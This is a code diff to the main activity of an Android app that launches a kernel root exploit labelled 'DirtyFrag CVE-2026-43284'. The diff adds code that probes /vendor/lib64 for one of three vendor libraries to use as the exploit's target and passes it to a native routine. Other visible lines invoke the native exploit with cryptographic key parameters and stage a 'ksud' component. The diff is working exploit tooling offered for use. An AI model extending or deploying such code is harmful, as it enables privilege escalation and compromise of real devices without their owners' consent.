@@ -49,6 +49,7 @@ public class MainActivity extends AppCompatActivity implements IReporter {
     static native int nativeRunAll(IReporter reporter, int encapPort, int spi,
                                     byte[] aesCbcKey, byte[] hmacKey, int icvLen,
                                     int senderPort, boolean softReboot);
+    static native void nativeSetKoTarget(String path);
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -58,6 +59,15 @@ public class MainActivity extends AppCompatActivity implements IReporter {
         setSupportActionBar(binding.toolbar);
 
         if (new File("/dev/df").exists()) binding.btnRun.setEnabled(false);
+
+        String koTarget = detectKoTarget();
+        if (koTarget == null) {
+            report("ERROR: no suitable ko_target found in /vendor/lib64 " +
+                   "(tried libbinderdebug.so, libstagefrighthw.so, libstagefright_aidl_bufferpool2.so)\n");
+            binding.btnRun.setEnabled(false);
+        } else {
+            nativeSetKoTarget(koTarget);
+        }
 
         binding.btnRun.setOnClickListener(v -> {
             binding.btnRun.setEnabled(false);
@@ -146,6 +156,27 @@ public class MainActivity extends AppCompatActivity implements IReporter {
                 binding.btnRun.setText("Launch Root (DirtyFrag CVE-2026-43284)");
             });
         }
+    }
+
+    private String detectKoTarget() {
+        String[] candidates = {
+            "/vendor/lib64/libbinderdebug.so",
+            "/vendor/lib64/libstagefrighthw.so",
+            "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
+        };
+        for (String path : candidates) {
+            try {
+                if (new File(path).exists()) {
+                    report("found ko_target: " + path + "\n");
+                    return path;
+                }
+                report(path + " not found\n");
+            } catch (SecurityException e) {
+                report("unable to scan for ko_target, falling back to libbinderdebug.so\n");
+                return candidates[0];
+            }
+        }
+        return null;
     }
 
     static void stageKsud(Context ctx, IReporter reporter) throws IOException {
